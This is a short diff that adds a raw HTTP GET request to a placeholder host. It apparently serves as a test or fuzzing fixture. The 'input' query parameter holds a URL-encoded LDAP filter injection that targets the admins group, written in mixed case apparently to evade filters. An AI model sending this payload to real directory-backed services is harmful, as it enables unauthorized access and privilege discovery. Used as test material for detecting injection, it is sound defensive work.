@@ -1,0 +1,4 @@
+GET /a?input=*)(mEmBeRoF%3DcN%3DaDmInS,dC%3DcOrP HTTP/1.1
+Host: demo.example.com
+Connection: close
+
